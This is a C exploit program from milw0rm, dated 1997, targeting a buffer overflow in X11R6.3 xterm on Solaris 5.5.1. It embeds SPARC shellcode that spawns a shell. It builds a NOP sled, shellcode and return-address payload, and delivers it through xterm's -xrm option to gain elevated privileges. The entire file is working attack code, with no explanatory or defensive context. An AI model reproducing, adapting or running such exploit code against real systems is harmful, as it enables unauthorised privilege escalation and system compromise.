/*
 * X11R6.3 xterm exploit for solaris 5.5.1 by DCRH 28/5/97
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define EXTRA2 1300
#define BUF_LENGTH 400
#define EXTRA 500
   /* Need an addr such that contents of addr+0xe98 = 0 */
#define SAFE_ADDR ((unsigned)0xefff2008)
#define STACK_OFFSET 0x4800
#define SPARC_NOP 0xa61cc013

u_long sparc_shellcode[] =
{
    0x2d0bd89a, /* sethi  %hi(0x2f626800), %l6  */
    0xac15a16e, /* or  %l6, 0x16e, %l6          */
    0x2f0bdadc, /* sethi  %hi(0x2f6b7000), %l7  */
    0xae15e368, /* or  %l7, 0x368, %l7          */
    0x900b800e, /* and  %sp, %sp, %o0           */
    0x9203a00c, /* add  %sp, 0xc, %o1           */
    0x941ac00b, /* xor  %o3, %o3, %o2           */
    0x9c03a014, /* add  %sp, 0x14, %sp          */
    0xec3bbfec, /* std  %l6, [ %sp + -20 ]      */
    0xc023bff4, /* clr  [ %sp + -12 ]           */
    0xdc23bff8, /* st  %sp, [ %sp + -8 ]        */
    0xc023bffc, /* clr  [ %sp + -4 ]            */
    0x8210203b, /* mov  0x3b, %g1               */
    0x91d02008, /* ta  8                        */
    0xffffffff, /* illegal                      */
};

u_long get_sp(void)
{
    asm("mov %sp,%i0 \n");
}

char buf[BUF_LENGTH + EXTRA + EXTRA2 + 8];
char longvar[0x4000] = "BLAH=";

void main(int argc, char *argv[])
{
    char *env[2];
    unsigned long targ_addr;
    u_long *long_p;
    int i, code_length = sizeof(sparc_shellcode),dso=0;

    if(argc > 1) dso=atoi(argv[1]);

    long_p =(u_long *) buf;

    for (i = 0; i < EXTRA2 / sizeof(u_long); i++)
        *long_p++ = (SAFE_ADDR >> 8) | (SAFE_ADDR << 24);

    targ_addr = get_sp() - STACK_OFFSET - dso;
    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = SPARC_NOP;

    for (i = 0; i < code_length / sizeof(u_long); i++)
        *long_p++ = sparc_shellcode[i];

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = targ_addr;

    printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
           targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);

    /* This is just to shove the stack down a bit */
    memset(&longvar[5], 'a', sizeof longvar-6);
    longvar[sizeof longvar -1] = '\0';
    env[0] = longvar;
    env[1] = NULL;

    execle("./xterm", "xterm", "-xrm", buf,(char *) 0, env);
    perror("execl failed");
}

// milw0rm.com [1997-05-28]